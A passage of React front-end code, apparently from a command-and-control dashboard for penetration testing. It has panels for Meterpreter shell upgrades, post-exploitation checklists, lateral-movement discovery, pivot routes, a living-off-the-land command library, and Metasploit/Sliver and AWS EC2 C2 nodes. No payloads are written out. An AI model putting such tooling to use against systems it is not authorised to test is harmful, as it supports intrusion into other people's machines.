                      title={activeSession.session_type.includes('meterpreter') ? 'Already Meterpreter' : 'Upgrade shell → Meterpreter'}
                      style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '6px 12px', borderRadius: 4, background: 'rgba(167,139,250,0.08)', border: '1px solid rgba(167,139,250,0.2)', fontSize: 11, color: '#a78bfa', cursor: (upgrading || activeSession.session_type.includes('meterpreter')) ? 'not-allowed' : 'pointer', opacity: (upgrading || activeSession.session_type.includes('meterpreter')) ? 0.4 : 1, fontFamily: 'var(--font-sans)' }}
                    >
                      {upgrading ? <Icon name="refresh" size={12} className="animate-spin" /> : <Icon name="upload" size={12} />}
                      Upgrade Shell
                    </button>
                  </div>

                  {/* Action output */}
                  {(probeOutput || harvestOutput || upgradeOutput || screenshotResult) && (
                    <pre style={{ marginTop: 12, background: 'var(--bg)', borderRadius: 4, padding: 12, fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--fg-2)', whiteSpace: 'pre-wrap', border: rule, maxHeight: 160, overflowY: 'auto' }}>
                      {probeOutput || harvestOutput || upgradeOutput || screenshotResult}
                    </pre>
                  )}
                </div>

                {/* Parse Sysinfo */}
                <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden' }}>
                  <div style={{ padding: '10px 16px', borderBottom: rule, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                    <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.05em', display: 'flex', alignItems: 'center', gap: 8 }}>
                      <Icon name="shield" size={13} /> Parse Sysinfo
                    </span>
                    {activeSession.sysinfo?.hostname && (
                      <span style={{ fontSize: 10, fontFamily: 'var(--font-mono)', color: 'var(--accent)', overflow: 'hidden', textOverflow: 'ellipsis', maxWidth: 120 }}>
                        {activeSession.sysinfo.hostname}
                      </span>
                    )}
                  </div>
                  <div style={{ padding: 12, display: 'flex', flexDirection: 'column', gap: 8 }}>
                    {activeSession.sysinfo ? (
                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', columnGap: 12, rowGap: 4, fontSize: 11, fontFamily: 'var(--font-mono)' }}>
                        {([
                          ['hostname', activeSession.sysinfo.hostname, 'var(--accent)'],
                          ['os',       activeSession.sysinfo.os,       'var(--fg)'],
                          ['arch',     activeSession.sysinfo.arch,     'var(--fg)'],
                          ['user',     activeSession.sysinfo.username, 'var(--ok)'],
                          ['domain',   activeSession.sysinfo.domain,   '#a78bfa'],
                        ] as [string, string | null, string][]).filter(([, v]) => v).map(([k, v, clr]) => (
                          <div key={k} style={{ display: 'flex', gap: 6, gridColumn: '1 / -1' }}>
                            <span style={{ color: 'var(--fg-4)', width: 56, flexShrink: 0 }}>{k}</span>
                            <span style={{ color: clr, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={v!}>{v}</span>
                          </div>
                        ))}
                        {activeSession.sysinfo.is_admin !== null && (
                          <div style={{ display: 'flex', gap: 6, gridColumn: '1 / -1' }}>
                            <span style={{ color: 'var(--fg-4)', width: 56, flexShrink: 0 }}>admin</span>
                            <span style={{ color: activeSession.sysinfo.is_admin ? 'var(--accent)' : 'var(--fg-3)', fontWeight: activeSession.sysinfo.is_admin ? 700 : 400 }}>
                              {activeSession.sysinfo.is_admin ? 'YES' : 'no'}
                            </span>
                          </div>
                        )}
                      </div>
                    ) : (
                      <p style={{ fontSize: 11, color: 'var(--fg-4)' }}>No sysinfo parsed yet. Paste command output below.</p>
                    )}
                    <textarea
                      value={sysinfoRaw}
                      onChange={e => setSysinfoRaw(e.target.value)}
                      placeholder="Paste sysinfo / systeminfo / uname -a output here…"
                      style={{ width: '100%', background: 'var(--bg)', border: rule, borderRadius: 4, padding: '6px 8px', fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--fg-2)', outline: 'none', resize: 'none', boxSizing: 'border-box' }}
                      rows={4}
                    />
                    <button
                      onClick={handleParseSysinfo}
                      disabled={parsingSysinfo || !sysinfoRaw.trim()}
                      style={{ width: '100%', padding: '6px 0', borderRadius: 4, background: 'rgba(240,168,58,0.08)', border: '1px solid rgba(240,168,58,0.2)', fontSize: 11, color: 'var(--accent)', cursor: (parsingSysinfo || !sysinfoRaw.trim()) ? 'not-allowed' : 'pointer', opacity: (parsingSysinfo || !sysinfoRaw.trim()) ? 0.4 : 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6, fontFamily: 'var(--font-sans)' }}
                    >
                      {parsingSysinfo ? <Icon name="refresh" size={11} className="animate-spin" /> : <Icon name="shield" size={11} />}
                      Parse & Save
                    </button>
                  </div>
                </div>

                {/* Checklist */}
                <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden' }}>
                  <div style={{ padding: '10px 16px', borderBottom: rule, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                    <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.05em', display: 'flex', alignItems: 'center', gap: 8 }}>
                      <Icon name="check" size={13} /> Post-Ex Checklist
                    </span>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <span style={{ fontSize: 11, color: 'var(--fg-4)' }}>
                        {checklist.filter(i => i.done).length}/{checklist.length} done
                      </span>
                      <button
                        onClick={async () => {
                          if (!activeSession) return
                          const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/checklist/reset`, { method: 'POST' })
                          if (res.ok) setChecklist(await res.json())
                        }}
                        style={{ fontSize: 11, color: 'var(--fg-4)', background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'var(--font-sans)' }}
                        title="Reset checklist"
                      >
                        Reset
                      </button>
                    </div>
                  </div>
                  {(['recon', 'creds', 'escalation', 'evidence', 'persistence', 'lateral'] as const).map(cat => {
                    const items = checklist.filter(i => i.category === cat)
                    if (!items.length) return null
                    const catLabels: Record<string, string> = {
                      recon: 'Recon', creds: 'Credentials', escalation: 'Escalation',
                      evidence: 'Evidence', persistence: 'Persistence', lateral: 'Lateral Movement',
                    }
                    return (
                      <div key={cat} style={{ borderBottom: rule }}>
                        <div style={{ padding: '6px 16px', background: 'rgba(240,168,58,0.04)', fontSize: 10, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
                          {catLabels[cat]}
                        </div>
                        {items.map(item => (
                          <label key={item.id} style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '10px 16px', cursor: 'pointer' }}>
                            <input
                              type="checkbox"
                              checked={item.done}
                              onChange={e => toggleChecklistItem(item.id, e.target.checked)}
                              style={{ width: 14, height: 14, accentColor: 'var(--accent)', cursor: 'pointer', flexShrink: 0 }}
                            />
                            <span style={{ fontSize: 11, color: item.done ? 'var(--fg-4)' : 'var(--fg)', textDecoration: item.done ? 'line-through' : 'none' }}>
                              {item.label}
                            </span>
                            {item.done && item.done_at && (
                              <span style={{ marginLeft: 'auto', fontSize: 10, color: 'var(--fg-4)', flexShrink: 0 }}>
                                {new Date(item.done_at).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'})}
                              </span>
                            )}
                          </label>
                        ))}
                      </div>
                    )
                  })}
                </div>

                {/* Lateral Movement Discovery */}
                <div style={{ background: 'var(--bg-2)', border: '1px solid rgba(240,168,58,0.2)', borderRadius: 4, overflow: 'hidden' }}>
                  <div style={{ padding: '10px 16px', borderBottom: '1px solid rgba(240,168,58,0.15)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                    <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.05em', display: 'flex', alignItems: 'center', gap: 8 }}>
                      <Icon name="network" size={13} style={{ color: 'var(--accent)' }} /> Lateral Movement
                    </span>
                    <button
                      onClick={handleLateralDiscover}
                      disabled={discoveringLateral}
                      style={{ display: 'flex', alignItems: 'center', gap: 4, padding: '4px 8px', borderRadius: 4, background: 'rgba(240,168,58,0.08)', border: '1px solid rgba(240,168,58,0.2)', fontSize: 10, color: 'var(--accent)', cursor: discoveringLateral ? 'not-allowed' : 'pointer', opacity: discoveringLateral ? 0.4 : 1, fontFamily: 'var(--font-sans)' }}
                    >
                      {discoveringLateral ? <Icon name="refresh" size={10} className="animate-spin" /> : <Icon name="bolt" size={10} />}
                      {lateralResult ? 'Re-Analyse' : 'Analyse'}
                    </button>
                  </div>

                  {lateralResult ? (
                    <div style={{ padding: 12, display: 'flex', flexDirection: 'column', gap: 12, fontSize: 11 }}>
                      {/* Subnets */}
                      <div>
                        <div style={{ fontSize: 10, color: 'var(--fg-4)', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: 4 }}>Adjacent Subnets</div>
                        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6 }}>
                          {lateralResult.subnets.map(s => (
                            <button
                              key={s}
                              onClick={() => setNewRouteSubnet(s.split('/')[0])}
                              style={{ fontFamily: 'var(--font-mono)', fontSize: 10, padding: '2px 6px', borderRadius: 4, background: 'rgba(240,168,58,0.08)', border: '1px solid rgba(240,168,58,0.2)', color: 'var(--accent)', cursor: 'pointer' }}
                              title="Click to prefill route"
                            >
                              {s}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Techniques */}
                      <div>
                        <div style={{ fontSize: 10, color: 'var(--fg-4)', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: 4 }}>
                          Techniques ({lateralResult.cred_types_available.length > 0 ? lateralResult.cred_types_available.join(', ') : 'no creds'})
                        </div>
                        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                          {lateralResult.techniques.map(t => (
                            <div key={t.id} style={{ display: 'flex', alignItems: 'flex-start', gap: 8, padding: 8, borderRadius: 4, background: 'rgba(240,168,58,0.06)', border: '1px solid rgba(240,168,58,0.15)' }}>
                              <Icon name="target" size={10} style={{ color: 'var(--accent)', flexShrink: 0, marginTop: 2 }} />
                              <div style={{ flex: 1, minWidth: 0 }}>
                                <div style={{ fontWeight: 500, color: 'var(--fg)' }}>{t.label}</div>
                                <div style={{ fontSize: 10, color: 'var(--fg-3)', marginTop: 2 }}>{t.description}</div>
                                {t.msf_module && (
                                  <div style={{ display: 'flex', alignItems: 'center', gap: 4, marginTop: 4 }}>
                                    <code style={{ fontSize: 9, fontFamily: 'var(--font-mono)', color: 'var(--accent)' }}>{t.msf_module}</code>
                                    <button
                                      onClick={() => navigator.clipboard.writeText(t.msf_module!)}
                                      style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 0 }}
                                    >
                                      <Icon name="copy" size={9} />
                                    </button>
                                  </div>
                                )}
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Discovery modules */}
                      <div>
                        <div style={{ fontSize: 10, color: 'var(--fg-4)', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: 4 }}>Discovery Modules</div>
                        {lateralResult.discovery_modules.map(m => (
                          <div key={m.name} style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '4px 0', borderBottom: rule }}>
                            <code style={{ fontSize: 9, fontFamily: 'var(--font-mono)', color: 'var(--fg-3)', flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{m.name}</code>
                            <button onClick={() => navigator.clipboard.writeText(m.name)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 0, flexShrink: 0 }}>
                              <Icon name="copy" size={9} />
                            </button>
                          </div>
                        ))}
                      </div>
                    </div>
                  ) : (
                    <div style={{ padding: '20px 16px', textAlign: 'center', fontSize: 11, color: 'var(--fg-4)' }}>
                      Click Analyse to discover pivot paths and lateral movement opportunities.
                    </div>
                  )}
                </div>

                {/* Pivot Routes */}
                <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden' }}>
                  <div style={{ padding: '10px 16px', borderBottom: rule, display: 'flex', alignItems: 'center', gap: 8 }}>
                    <Icon name="network" size={13} style={{ color: 'var(--accent)' }} />
                    <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>Pivot Routes</span>
                    {pivotRoutes.length > 0 && <span style={{ fontSize: 11, color: 'var(--accent)', marginLeft: 4 }}>({pivotRoutes.length})</span>}
                  </div>

                  {/* Add route form */}
                  <div style={{ padding: 16, borderBottom: rule }}>
                    <div style={{ display: 'flex', gap: 8, alignItems: 'flex-end' }}>
                      <div style={{ flex: 1 }}>
                        <label style={{ fontSize: 10, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Subnet</label>
                        <input
                          value={newRouteSubnet}
                          onChange={e => setNewRouteSubnet(e.target.value)}
                          placeholder="10.10.10.0"
                          style={inputClass}
                        />
                      </div>
                      <div style={{ width: 160 }}>
                        <label style={{ fontSize: 10, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Netmask</label>
                        <input
                          value={newRouteNetmask}
                          onChange={e => setNewRouteNetmask(e.target.value)}
                          placeholder="255.255.255.0"
                          style={inputClass}
                        />
                      </div>
                      <button
                        onClick={handleAddRoute}
                        disabled={addingRoute || !newRouteSubnet}
                        style={{ padding: '8px 16px', borderRadius: 4, background: 'var(--accent)', border: 'none', color: '#0d0c0a', fontSize: 13, fontWeight: 600, cursor: (addingRoute || !newRouteSubnet) ? 'not-allowed' : 'pointer', opacity: (addingRoute || !newRouteSubnet) ? 0.4 : 1, flexShrink: 0, display: 'flex', alignItems: 'center', fontFamily: 'var(--font-sans)' }}
                      >
                        {addingRoute ? <Icon name="refresh" size={14} className="animate-spin" /> : 'Add'}
                      </button>
                    </div>
                  </div>

                  {pivotRoutes.length === 0 ? (
                    <div style={{ textAlign: 'center', color: 'var(--fg-4)', padding: '24px 0', fontSize: 11 }}>No pivot routes added</div>
                  ) : (
                    <div>
                      {pivotRoutes.map(r => (
                        <div key={r.id} style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '10px 16px', borderBottom: rule }}>
                          <span style={{ width: 8, height: 8, borderRadius: '50%', background: 'var(--ok)', flexShrink: 0 }} />
                          <code style={{ flex: 1, fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--fg)' }}>{r.subnet}/{r.netmask}</code>
                          <span style={{ fontSize: 10, color: 'var(--fg-4)', marginRight: 8 }}>via session {r.session_id}</span>
                          <button onClick={() => handleRemoveRoute(r.id)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 0 }}>
                            <Icon name="x" size={13} />
                          </button>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </>
            )}
          </div>
        )}

        {/* LOTL tab */}
        {activeTab === 'lotl' && (
          <div style={{ flex: 1, overflowY: 'auto' }}>
            <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, padding: 16, marginBottom: 16 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap' }}>
                <h3 style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg)', display: 'flex', alignItems: 'center', gap: 8 }}>
                  <Icon name="book" size={14} style={{ color: 'var(--accent)' }} /> Living-off-the-Land Command Library
                </h3>
                <input
                  style={{ flex: 1, minWidth: 160, background: 'var(--bg)', border: rule, borderRadius: 4, padding: '4px 12px', fontSize: 11, color: 'var(--fg)', outline: 'none' }}
                  placeholder="Search commands..."
                  value={lotlSearch}
                  onChange={e => setLotlSearch(e.target.value)}
                />
                <div style={{ display: 'flex', gap: 4 }}>
                  {(['all', 'linux', 'windows'] as const).map(f => (
                    <button key={f} onClick={() => setLotlFilter(f)}
                      style={{ padding: '4px 10px', borderRadius: 4, fontSize: 11, cursor: 'pointer', fontFamily: 'var(--font-sans)', background: lotlFilter === f ? 'var(--accent)' : 'none', color: lotlFilter === f ? '#0d0c0a' : 'var(--fg-3)', border: lotlFilter === f ? 'none' : rule, fontWeight: lotlFilter === f ? 600 : 400 }}>
                      {f === 'all' ? 'All' : f === 'linux' ? 'Linux' : 'Windows'}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            {lotlLib.length === 0 ? (
              <div style={{ color: 'var(--fg-4)', fontSize: 13, textAlign: 'center', padding: '48px 0' }}>Loading...</div>
            ) : lotlLib.map(cat => {
              const cmds = cat.commands.filter(c => {
                if (lotlFilter !== 'all' && c.platform !== lotlFilter) return false
                if (lotlSearch) {
                  const q = lotlSearch.toLowerCase()
                  return c.label.toLowerCase().includes(q) || c.cmd.toLowerCase().includes(q) || c.mitre.toLowerCase().includes(q) || c.notes.toLowerCase().includes(q)
                }
                return true
              })
              if (cmds.length === 0) return null
              return (
                <div key={cat.id} style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, marginBottom: 16, overflow: 'hidden' }}>
                  <div style={{ padding: '8px 16px', borderBottom: rule, background: 'rgba(240,168,58,0.04)' }}>
                    <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--accent)' }}>{cat.label}</span>
                  </div>
                  <div>
                    {cmds.map(cmd => (
                      <div key={cmd.id} style={{ padding: 12, borderBottom: rule }}>
                        <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', gap: 8, marginBottom: 4 }}>
                          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                            <span style={{ fontSize: 9, padding: '2px 6px', borderRadius: 4, fontFamily: 'var(--font-mono)', color: cmd.platform === 'linux' ? 'var(--ok)' : 'var(--med)', background: cmd.platform === 'linux' ? 'rgba(84,175,97,0.1)' : 'rgba(180,130,60,0.1)' }}>
                              {cmd.platform}
                            </span>
                            <span style={{ fontSize: 11, color: 'var(--fg)', fontWeight: 500 }}>{cmd.label}</span>
                          </div>
                          <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexShrink: 0 }}>
                            <span style={{ fontSize: 10, color: 'var(--accent)', fontFamily: 'var(--font-mono)', opacity: 0.7 }}>{cmd.mitre}</span>
                            <button
                              onClick={() => { navigator.clipboard.writeText(cmd.cmd); setLotlCopied(cmd.id); setTimeout(() => setLotlCopied(''), 2000) }}
                              style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 0 }}
                              title="Copy command"
                            >
                              {lotlCopied === cmd.id ? <Icon name="check" size={12} style={{ color: 'var(--ok)' }} /> : <Icon name="copy" size={12} />}
                            </button>
                          </div>
                        </div>
                        <pre style={{ fontSize: 10, color: 'var(--fg-2)', fontFamily: 'var(--font-mono)', background: 'var(--bg)', borderRadius: 4, padding: '6px 8px', overflowX: 'auto', marginBottom: 4, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>{cmd.cmd}</pre>
                        <p style={{ fontSize: 10, color: 'var(--fg-3)' }}>{cmd.notes}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )
            })}
          </div>
        )}

        {/* Infrastructure tab */}
        {activeTab === 'infra' && (
          <div style={{ flex: 1, overflowY: 'auto', padding: '0 0 24px 0' }}>

            {/* C2 Node Registry */}
            <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, margin: '16px 0', overflow: 'hidden' }}>
              <div style={{ padding: '12px 16px', borderBottom: rule, display: 'flex', alignItems: 'center', gap: 12 }}>
                <Icon name="radio" size={14} style={{ color: 'var(--accent)' }} />
                <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg)' }}>C2 Node Registry</span>
                <div style={{ marginLeft: 'auto', display: 'flex', gap: 8 }}>
                  <button
                    onClick={() => { c2Nodes.forEach(n => handleCheckNode(n.id)) }}
                    className="btn btn-sm btn-ghost"
                    disabled={c2Nodes.length === 0}
                  >Check All</button>
                  <button
                    onClick={() => setAddNodeOpen(o => !o)}
                    className="btn btn-sm"
                  ><Icon name="plus" size={11} /> Add Node</button>
                </div>
              </div>

              {addNodeOpen && (
                <div style={{ padding: 16, borderBottom: rule, background: 'rgba(240,168,58,0.03)', display: 'flex', flexDirection: 'column', gap: 12 }}>
                  {nodeError && <div style={{ fontSize: 11, color: 'var(--crit)', fontFamily: 'var(--font-mono)' }}>{nodeError}</div>}
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10 }}>
                    <div>
                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>NAME</label>
                      <input value={nodeFormName} onChange={e => setNodeFormName(e.target.value)} placeholder="My MSF Server" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
                    </div>
                    <div>
                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>TYPE</label>
                      <select value={nodeFormType} onChange={e => setNodeFormType(e.target.value as 'msf' | 'sliver')} style={{ width: '100%', padding: '6px 10px', fontSize: 12, background: 'var(--bg)', border: rule, color: 'var(--fg)' }}>
                        <option value="msf">Metasploit (msfrpcd)</option>
                        <option value="sliver">Sliver</option>
                      </select>
                    </div>
                    <div>
                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>HOST</label>
                      <input value={nodeFormHost} onChange={e => setNodeFormHost(e.target.value)} placeholder="192.168.1.100" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
                    </div>
                    <div>
                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>PORT</label>
                      <input value={nodeFormPort} onChange={e => setNodeFormPort(e.target.value)} placeholder="55553" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
                    </div>
                    <div>
                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>PASSWORD</label>
                      <input type="password" value={nodeFormPass} onChange={e => setNodeFormPass(e.target.value)} placeholder="RPC password" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
                    </div>
                    <div style={{ display: 'flex', alignItems: 'flex-end', gap: 10 }}>
                      <label style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 11, color: 'var(--fg-2)', cursor: 'pointer' }}>
                        <input type="checkbox" checked={nodeFormSsl} onChange={e => setNodeFormSsl(e.target.checked)} />
                        SSL / TLS
                      </label>
                    </div>
                  </div>
                  <input value={nodeFormNotes} onChange={e => setNodeFormNotes(e.target.value)} placeholder="Notes (optional)" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
                  <div style={{ display: 'flex', gap: 8 }}>
                    <button onClick={handleAddNode} disabled={savingNode} className="btn btn-sm btn-primary">{savingNode ? 'Saving…' : 'Save Node'}</button>
                    <button onClick={() => { setAddNodeOpen(false); setNodeError('') }} className="btn btn-sm btn-ghost">Cancel</button>
                  </div>
                </div>
              )}

              {loadingNodes ? (
                <div style={{ padding: '32px 16px', textAlign: 'center', color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', fontSize: 11 }}>Loading…</div>
              ) : c2Nodes.length === 0 ? (
                <div style={{ padding: '32px 16px', textAlign: 'center', color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', fontSize: 11 }}>No C2 nodes registered. Add one above or launch an EC2 instance below.</div>
              ) : (
                <table className="data">
                  <thead>
                    <tr>
                      <th>Name</th>
                      <th style={{ width: 80 }}>Type</th>
                      <th style={{ width: 180 }}>Host : Port</th>
                      <th style={{ width: 90 }}>Status</th>
                      <th style={{ width: 70 }}>Source</th>
                      <th style={{ width: 140 }}></th>
                    </tr>
                  </thead>
                  <tbody>
                    {c2Nodes.map(n => {
                      const isActive = n.id === activeNodeId
                      const statusColor = n.status === 'connected' ? 'var(--ok)' : n.status === 'unreachable' ? 'var(--crit)' : n.status === 'pending' ? 'var(--accent)' : 'var(--fg-3)'
                      return (
                        <tr key={n.id} style={{ background: isActive ? 'rgba(84,175,97,0.04)' : undefined }}>
                          <td style={{ fontWeight: 500 }}>
                            {n.name}
                            {isActive && <span style={{ fontSize: 9, marginLeft: 8, color: 'var(--ok)', fontFamily: 'var(--font-mono)', textTransform: 'uppercase' }}>active</span>}
                          </td>
                          <td>
                            <span style={{ fontSize: 10, padding: '2px 7px', fontFamily: 'var(--font-mono)', textTransform: 'uppercase', letterSpacing: '0.06em', color: n.c2_type === 'msf' ? 'var(--accent)' : '#a78bfa', background: n.c2_type === 'msf' ? 'rgba(240,168,58,0.1)' : 'rgba(167,139,250,0.1)', border: `1px solid ${n.c2_type === 'msf' ? 'rgba(240,168,58,0.3)' : 'rgba(167,139,250,0.3)'}` }}>{n.c2_type}</span>
                          </td>
                          <td className="mono" style={{ fontSize: 11 }}>{n.host}:{n.port}</td>
                          <td>
                            <span style={{ fontSize: 10, padding: '2px 7px', fontFamily: 'var(--font-mono)', textTransform: 'uppercase', letterSpacing: '0.06em', color: statusColor }}>{n.status}</span>
                          </td>
                          <td>
                            <span style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)' }}>{n.source}</span>
                          </td>
                          <td>
                            <div style={{ display: 'flex', gap: 6 }}>
                              <button
                                onClick={() => handleCheckNode(n.id)}
                                disabled={checkingNodeId === n.id}
                                className="btn btn-sm btn-ghost"
                                style={{ fontSize: 10 }}
                              >{checkingNodeId === n.id ? '…' : 'Check'}</button>
                              <button
                                onClick={() => handleConnectNode(n.id)}
                                disabled={connectingNodeId === n.id || isActive}
                                className="btn btn-sm"
                                style={{ fontSize: 10, color: 'var(--ok)', borderColor: 'rgba(84,175,97,0.4)' }}
                              >{connectingNodeId === n.id ? 'Connecting…' : isActive ? 'Connected' : 'Connect'}</button>
                              <button
                                onClick={() => handleDeleteNode(n.id)}
                                className="btn btn-sm btn-ghost"
                                style={{ fontSize: 10, color: 'var(--crit)' }}
                              >Del</button>
                            </div>
                          </td>
                        </tr>
                      )
                    })}
                  </tbody>
                </table>
              )}
            </div>

            {/* AWS EC2 Provisioning */}
            <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden' }}>
              <div style={{ padding: '12px 16px', borderBottom: rule, display: 'flex', alignItems: 'center', gap: 12 }}>
                <Icon name="layers" size={14} style={{ color: '#a78bfa' }} />
                <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg)' }}>AWS EC2 C2 Nodes</span>
                <div style={{ marginLeft: 'auto', display: 'flex', gap: 8 }}>
                  <button onClick={() => setCloudSettingsOpen(o => !o)} className="btn btn-sm btn-ghost" style={{ fontSize: 10 }}>AWS Settings</button>
                  <button onClick={() => setLaunchFormOpen(o => !o)} className="btn btn-sm" style={{ fontSize: 10, color: '#a78bfa', borderColor: 'rgba(167,139,250,0.4)' }}>
                    <Icon name="plus" size={11} /> Launch EC2 Node
                  </button>
                </div>
              </div>

              {cloudSettingsOpen && (
                <div style={{ padding: 16, borderBottom: rule, background: 'rgba(167,139,250,0.03)', display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 180px', gap: 10 }}>
                    <div>
                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>ACCESS KEY ID</label>
                      <input type="password" value={awsAccessKey} onChange={e => setAwsAccessKey(e.target.value)} placeholder="AKIAIOSFODNN7EXAMPLE" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
                    </div>
                    <div>
                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>SECRET ACCESS KEY</label>
                      <input type="password" value={awsSecretKey} onChange={e => setAwsSecretKey(e.target.value)} placeholder="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
                    </div>
                    <div>
                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>REGION</label>
                      <select value={awsRegion} onChange={e => setAwsRegion(e.target.value)} style={{ width: '100%', padding: '6px 10px', fontSize: 12, background: 'var(--bg)', border: rule, color: 'var(--fg)' }}>
                        {['us-east-1','us-east-2','us-west-1','us-west-2','eu-west-1','eu-west-2','eu-central-1','ap-southeast-1','ap-southeast-2','ap-northeast-1','sa-east-1','ca-central-1'].map(r => <option key={r} value={r}>{r}</option>)}
                      </select>
                    </div>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                    <button onClick={handleSaveCloudCreds} disabled={savingCloudCreds || !awsAccessKey || !awsSecretKey} className="btn btn-sm">{savingCloudCreds ? 'Saving…' : 'Save & Verify'}</button>
                    {cloudStatus && (
                      <span style={{ fontSize: 11, fontFamily: 'var(--font-mono)', color: cloudStatus.valid ? 'var(--ok)' : 'var(--crit)' }}>
                        {cloudStatus.valid ? `Account: ${cloudStatus.account_id}` : cloudStatus.error ?? 'Invalid credentials'}
                      </span>
                    )}
                  </div>
                </div>
              )}

              {launchFormOpen && (
                <div style={{ padding: 16, borderBottom: rule, background: 'rgba(167,139,250,0.03)', display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr 1fr', gap: 10 }}>
                    <div>
                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>NODE NAME</label>
                      <input value={launchName} onChange={e => setLaunchName(e.target.value)} placeholder="c2-node-1" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
                    </div>
                    <div>
                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>C2 TYPE</label>
